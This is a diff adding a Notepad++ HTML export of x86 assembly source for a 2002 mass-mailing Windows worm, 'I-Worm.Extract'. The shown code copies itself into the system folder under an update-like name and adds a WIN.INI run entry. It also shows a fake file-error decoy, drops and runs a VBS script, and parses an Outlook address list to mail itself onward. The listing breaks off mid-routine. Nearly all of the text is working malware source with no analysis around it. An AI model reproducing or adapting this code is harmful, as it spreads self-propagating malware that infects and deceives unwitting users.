@@ -1,0 +1,533 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF8000;
+}
+.sc3 {
+	color: #808080;
+}
+.sc4 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc5 {
+}
+.sc6 {
+	font-weight: bold;
+	color: #0000FF;
+}
+.sc8 {
+	font-weight: bold;
+	color: #8080FF;
+}
+.sc9 {
+	color: #0080FF;
+}
+.sc10 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc12 {
+	color: #808000;
+}
+.sc13 {
+	color: #808080;
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment #</span><span class="sc0">
+</span><span class="sc1">; Name : I-Worm.Extract</span><span class="sc0">
+</span><span class="sc1">; Author : PetiK</span><span class="sc0">
+</span><span class="sc1">; Date : February 3rd 2002 - February 4th 2002</span><span class="sc0">
+</span><span class="sc1">; Size : 5632</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; Action :</span><span class="sc0">
+</span><span class="sc1">; #</span><span class="sc0">
+
+</span><span class="sc2">.586p</span><span class="sc0">
+</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
+</span><span class="sc9">.code</span><span class="sc0">
+
+</span><span class="sc5">JUMPS</span><span class="sc0">
+
+</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
+</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
+</span><span class="sc9">endm</span><span class="sc0">
+
+</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Useful.inc</span><span class="sc0">
+</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">myinclude.inc</span><span class="sc0">
+
+</span><span class="sc5">start_worm</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"KERNEL32.DLL"</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
+
+</span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sz</span><span class="sc4">&amp;</span><span class="sc5">x</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_ptk</span><span class="sc4">&amp;</span><span class="sc5">x</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc9">endm</span><span class="sc0">
+
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">CopyFileA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">CreateDirectoryA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">DeleteFileA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">GetDateFormatA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">GetSystemTime</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">GetTimeFormatA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">lstrcat</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">lstrcmp</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">lstrcpy</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">lstrlen</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">MapViewOfFile</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">Sleep</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">WinExec</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">WriteFile</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">WriteProfileStringA</span><span class="sc0">
+    </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0">
+
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_worm</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkGetModuleFileNameA</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">verif_worm</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkGetSystemDirectoryA</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"\UPDATEW32.EXE"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">verif_worm</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptklstrcat</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">verif_worm</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptklstrcmp</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">continue_worm</span><span class="sc0">
+
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">copy_worm</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkGetSystemDirectoryA</span><span class="sc0">
+    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">"dpU\"
+</span><span class="sc0">    </span><span class="sc6">stosd</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"Weta"</span><span class="sc0">
+    </span><span class="sc6">stosd</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"e.23"</span><span class="sc0">
+    </span><span class="sc6">stosd</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"ex"</span><span class="sc0">
+    </span><span class="sc6">stosd</span><span class="sc0">
+    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
+
+</span><span class="sc5">copy_w</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkCopyFileA</span><span class="sc0">
+
+</span><span class="sc5">run_w</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"RUN"</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"WINDOWS"</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkWriteProfileStringA</span><span class="sc0">
+
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateDate</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">realname</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_worm</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetFileTitleA</span><span class="sc0">
+
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">" - "</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">date</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptklstrcat</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">realname</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">date</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptklstrcat</span><span class="sc0">
+
+</span><span class="sc5">f_mess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">date</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@mess</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Cannot Open this File !"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"If you downloaded this file, try downloading again."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc5">@mess</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
+    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_worm</span><span class="sc0">
+
+</span><span class="sc5">continue_worm</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbsfile</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkGetWindowsDirectoryA</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"\ExtractVbs.vbs"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbsfile</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptklstrcat</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">20h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbsfile</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkCreateFileA</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">octets</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">e_vbs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">s_vbs</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_vbs</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkWriteFile</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkCloseHandle</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbsfile</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbsexec</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptklstrcpy</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">execcontrol</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkWinExec</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">5000</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkSleep</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbsfile</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkDeleteFileA</span><span class="sc0">
+
+</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Systime</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkGetSystemTime</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Systime.wDay</span><span class="sc4">],</span><span class="sc2">29</span><span class="sc0">
+    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_pay</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40h</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"I-Worm.Extract"</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">e_mess</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Hi man, you received my worm !"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Don't panic, it doesn't format your computer"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc3">"Bye and Have a Nice Day."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc5">e_mess</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
+</span><span class="sc5">end_pay</span><span class="sc4">:</span><span class="sc0">
+
+</span><span class="sc5">sh_gsf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">progra</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">SHGetSpecialFolderPathA</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">progra</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkSetCurrentDirectoryA</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Update Windows 32bits"</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkCreateDirectoryA</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"\Update Windows 32bits"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">progra</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptklstrcat</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">progra</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkSetCurrentDirectoryA</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"MAJ.exe"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_worm</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkCopyFileA</span><span class="sc0">
+
+</span><span class="sc5">verif_inet</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inet</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">InternetGetConnectedState</span><span class="sc0">
+    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">verif_inet</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winpath</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkGetWindowsDirectoryA</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winpath</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkSetCurrentDirectoryA</span><span class="sc0">
+
+</span><span class="sc5">spread</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Outlook_Addr.txt"</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkCreateFileA</span><span class="sc0">
+    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_spread</span><span class="sc0">
+    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
+
+    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkCreateFileMappingA</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_s1</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
+
+    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkMapViewOfFile</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_s2</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkGetFileSize</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
+    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">end_s3</span><span class="sc0">
+
+</span><span class="sc5">scan_mail</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_addr</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">p_c</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">" "</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">car_s</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">";"</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_m</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"#"</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">f_mail</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'@'</span><span class="sc0">
+    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_a</span><span class="sc0">
+    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
+    </span><span class="sc5">not_a</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
+        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">p_c</span><span class="sc0">
+    </span><span class="sc5">car_s</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
+        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">p_c</span><span class="sc0">
+    </span><span class="sc5">end_m</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
+        </span><span class="sc6">stosb</span><span class="sc0">
+        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
+        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
+        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">scan_mail</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_mail</span><span class="sc0">
+        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">scan_mail</span><span class="sc0">
+    </span><span class="sc5">f_mail</span><span class="sc4">:</span><span class="sc0">
+
